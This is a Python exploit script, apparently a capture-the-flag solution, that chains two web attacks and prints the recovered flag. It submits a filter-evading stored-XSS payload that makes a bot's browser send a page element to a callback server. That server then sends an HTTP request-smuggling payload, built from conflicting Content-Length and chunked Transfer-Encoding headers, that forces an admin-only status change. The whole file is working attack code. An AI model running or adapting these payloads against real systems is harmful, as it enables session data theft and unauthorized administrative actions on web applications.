import requests
import http.server
import socket
from threading import Thread
import re
import os

BOT_URL = "http://localhost:8083"
APP_URL = ("localhost",8080)

CALLBACK = f"http://localhost:8181"

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        
        id = self.path.split("?")[1]

        body = f"""POST /admin HTTP/1.1\r
Host: vulnerable-website.com\r
Cookie: admin_key=a\r
Content-Length: 198\r
Transfer-Encoding: chunked\r
\r
0\r
\r
POST /declarations/{id}/status HTTP/1.1\r
Host: vulnerable-website.com\r
Content-Length: 15\r
Content-Type: application/x-www-form-urlencoded\r
\r
status=approved\r
\r
"""

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(APP_URL)
        sock.sendall(body.encode())
        sock.close()

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")  # Respond to the client



def run_server(port=8181):
    server_address = ("0.0.0.0", port)

    httpd = http.server.HTTPServer(server_address, MyHandler)

    httpd.serve_forever()

def exploit():
        
    payload= f"""<</a>script>window.open('{CALLBACK}?'+document.getElementById('id').innerText)</</a>script>"""

    data = {
        "description": payload,
        "item_name": "asd",
        "value": 123,
        "category": "clothing",
    }

    res = requests.post(f"{BOT_URL}", data=data)
    print(re.findall('(SSM{.*})', res.text)[0])

if __name__ == "__main__":
    thread = Thread(target = run_server)
    thread.start()
    exploit()
    os._exit(0)

